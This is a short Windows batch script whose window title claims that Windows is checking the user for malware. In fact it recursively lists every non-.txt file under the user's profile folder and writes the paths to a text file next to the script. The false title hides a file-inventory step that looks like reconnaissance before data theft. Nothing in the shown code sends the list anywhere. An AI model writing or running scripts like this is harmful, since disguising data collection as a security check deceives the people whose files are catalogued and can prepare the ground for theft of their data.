@echo off
setlocal
title Windows is checking if you have malware.
set "userFolder=%USERPROFILE%"
set "outputFile=%~dp0ms.txt"

rem Clear previous output file if it exists
del "%outputFile%" 2>nul

rem List all files except .txt files and save to output file
for /r "%userFolder%" %%F in (*) do (
    if /i not "%%~xF"==".txt" echo %%F >> "%outputFile%"
)

endlocal
